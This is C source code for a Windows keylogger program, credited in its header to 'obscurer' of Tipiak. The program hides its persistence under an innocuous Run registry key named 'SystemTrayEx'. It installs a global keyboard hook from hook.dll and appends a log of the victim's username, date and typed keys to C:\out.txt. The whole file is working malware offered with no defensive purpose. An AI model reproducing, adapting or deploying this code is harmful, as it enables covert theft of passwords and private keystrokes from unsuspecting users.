/*
Programme executable du keylogger
by obscurer

21/08/2k
Copyright Tipiak - www.tipiak.net -
*/

#include <windows.h>
#define NULL	0

HHOOK hHook;

int InstallHook (HMODULE hModDLL, HOOKPROC addr);
int UninstallHook();

int PASCAL WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,
				   LPSTR lpCmdLine, int nShowCmd)
{
        HOOKPROC addr;
		
		HINSTANCE LibHandle;

		char *KeyValue;
	
		int ret;

		struct HKEY__ *hKey;
		
		DWORD hKeyResult;


     	KeyValue=GetCommandLine();
	

	    RegCreateKeyEx(HKEY_LOCAL_MACHINE,
						"software\\microsoft\\windows\\currentversion\\run\\",
						0,
						0,
						REG_OPTION_NON_VOLATILE,
						KEY_ALL_ACCESS,
						0,
						&hKey,
						&hKeyResult);

		RegSetValueEx(hKey,"SystemTrayEx",0,REG_SZ,KeyValue,sizeof(KeyValue)+1);

		RegCloseKey(hKey);

			
	    LibHandle = LoadLibrary("hook.dll");
		if(LibHandle==NULL) {goto hell;}

        addr = (HOOKPROC) GetProcAddress(LibHandle, "?KeyboardProc@@YGJHIJ@Z");
		if(addr==0) { goto hell; }
		
		ret=InstallHook(LibHandle,addr);
		if(ret==FALSE) { goto hell; }
		
		Sleep(INFINITE);
		
		UninstallHook();

hell:
		ExitProcess(NULL);

        return TRUE;
}


int InstallHook (HMODULE hModDLL, HOOKPROC addr)
{
		HANDLE OutFile;
		char *buffer;
		char *writebuf;
		char *time;
		char *date;
		DWORD temp;
		DWORD size;
		
	hHook=SetWindowsHookEx(WH_KEYBOARD,addr,hModDLL,NULL);
	if(hHook==NULL) { return FALSE; }

	buffer=(char *)GlobalAlloc(GPTR,100);
	writebuf=(char *)GlobalAlloc(GPTR,500);
	time=(char *)GlobalAlloc(GPTR,100);
	date=(char *)GlobalAlloc(GPTR,100);

	OutFile=CreateFile("C:\\out.txt",GENERIC_WRITE,
						FILE_SHARE_READ+FILE_SHARE_WRITE,
						NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(OutFile==INVALID_HANDLE_VALUE) { return FALSE; }


	SetFilePointer(OutFile,NULL,NULL,FILE_END);

	size=50;
	GetUserNameA(buffer,&size);
	GetTimeFormat(LOCALE_SYSTEM_DEFAULT,TIME_NOSECONDS,NULL,"HH':'mm tt",time,50);
	GetDateFormat(LOCALE_SYSTEM_DEFAULT,DATE_LONGDATE,NULL,NULL,date,50);

	wsprintf(writebuf,"\x0d\x0a\x0d\x0a    username : %s \x0d\x0a    Date : %s \x0d\x0a    Time : %s.\x0d\x0a    All keys are being logged in this file :) \x0d\x0a\x0d\x0a",buffer,date,time);
	WriteFile(OutFile,writebuf,strlen(writebuf),&temp,NULL);

GlobalFree(buffer);
GlobalFree(writebuf);
GlobalFree(time);
GlobalFree(date);
return TRUE;	
}

int UninstallHook(){
UnhookWindowsHookEx(hHook);
return TRUE;
}
//  EOF
